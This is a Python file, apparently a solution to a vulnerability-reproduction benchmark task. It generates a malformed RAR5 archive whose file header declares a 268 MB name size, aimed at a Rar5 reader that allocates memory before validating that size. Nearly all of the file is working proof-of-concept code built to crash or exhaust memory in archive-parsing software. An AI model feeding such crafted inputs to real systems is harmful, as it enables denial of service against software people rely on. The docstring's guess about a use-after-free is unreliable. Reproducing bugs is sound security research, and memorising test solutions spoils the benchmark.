import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is that the Rar5 reader reads a name size, allocates memory
        for the name, and only then validates the name size. By providing a very
        large name size, we can trigger an excessive memory allocation, which can
        lead to memory exhaustion, an integer overflow in size calculations, or
        a crash in error handling paths, potentially a Use-After-Free.

        This PoC constructs a minimal RAR5 file with a single file header. This
        header specifies a huge name length, which is the trigger for the bug.
        The PoC is kept minimal to maximize the score.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """

        def encode_vint(n: int) -> bytes:
            """Encodes an integer into the RAR5 variable-length integer format."""
            if n == 0:
                return b'\x00'
            result = bytearray()
            while n > 0x7f:
                result.append((n & 0x7f) | 0x80)
                n >>= 7
            result.append(n)
            return bytes(result)

        # RAR5 magic signature, identifying the file as a RAR version 5 archive.
        magic = b'Rar!\x1a\x07\x01\x00'

        # --- Malicious File Header ---
        # This header is crafted to cause the vulnerability.
        file_header_body = bytearray()
        
        file_header_body += encode_vint(2)       # Header Type: File Header
        file_header_body += encode_vint(0)       # Header Flags: No extra data, no file data
        file_header_body += encode_vint(0)       # File-specific Flags
        file_header_body += encode_vint(0)       # Unpacked Size
        file_header_body += encode_vint(0)       # File Attributes
        file_header_body += encode_vint(0x30)    # Compression Info: 'Stored'
        file_header_body += encode_vint(2)       # Host OS: Unix
        
        # VULNERABILITY TRIGGER: A very large Name Size.
        # 0x0FFFFFFF (268MB) is large enough to trigger allocation failures or
        # integer overflows, while having a compact 4-byte VINT representation.
        large_name_size = 0x0FFFFFFF
        file_header_body += encode_vint(large_name_size)
        
        # A single byte for the name. The parser will attempt to read
        # `large_name_size` bytes, which will fail as the file is too short.
        file_header_body += b'A'
        
        # The full header block includes its own size and a CRC32 checksum.
        header_size_vint = encode_vint(len(file_header_body))
        full_header_payload = header_size_vint + file_header_body
        crc = zlib.crc32(full_header_payload)
        file_header_block = crc.to_bytes(4, 'little') + full_header_payload

        # --- End of Archive Header ---
        # A well-formed archive should end with this header.
        end_header_body = bytearray()
        
        end_header_body += encode_vint(6) # Header Type: End of Archive
        end_header_body += encode_vint(0) # Flags: No extra options
        
        # Construct the full end header block with its size and CRC.
        end_header_size_vint = encode_vint(len(end_header_body))
        full_end_header_payload = end_header_size_vint + end_header_body
        end_crc = zlib.crc32(full_end_header_payload)
        end_header_block = end_crc.to_bytes(4, 'little') + full_end_header_payload

        # Combine all parts to form the final PoC.
        poc = magic + file_header_block + end_header_block
        
        return poc